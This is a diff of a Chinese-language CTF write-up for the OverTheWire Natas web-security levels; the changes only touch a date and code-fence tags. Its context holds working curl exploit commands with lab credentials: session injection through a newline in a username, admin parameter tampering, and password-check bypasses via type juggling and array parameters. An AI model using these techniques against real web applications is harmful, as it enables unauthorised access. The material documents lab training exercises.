@@ -8,7 +8,7 @@ tags:
 ---
 //Description: overthewire 上的练习，学习web-security
 
-//Create Date: 2020-02-24 10:53:23
+//Create Date: 2020-03-24 10:53:23
 
 //Author: channy
 
@@ -818,7 +818,7 @@ Key：eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 由于服务端对sessionID进行了合法性校验，因此无法直接通过修改PHPSESSID来读取密码文件的信息
 但username没有任何校验，因此可以在其中注入\nadmin 1使读取的时候对Session进行间接篡改
 
-```sh
+```
 curl -isu natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org -d "name=head > admin 1"
 ```
 
@@ -850,7 +850,7 @@ if(array_key_exists("submit", $_REQUEST)) {
 }
 ```
 
-```sh
+```
 curl -isu natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org -d "submit=update" -d "admin=1"
 ```
 
@@ -862,7 +862,7 @@ chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
 
 23. 
 
-```sh
+```
 curl -isu natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org?revelio=1
 ```
 
@@ -886,7 +886,7 @@ if(array_key_exists("passwd",$_REQUEST)){
     // morla / 10111
 ```
 
-```sh
+```
 curl -isu natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org -F "passwd=11iloveyou"
 
 ...
@@ -907,7 +907,7 @@ if(array_key_exists("passwd",$_REQUEST)){
     }
 ```
 
-```sh
+```
 curl -isu natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org -F "passwd[]=1"
 
 ...
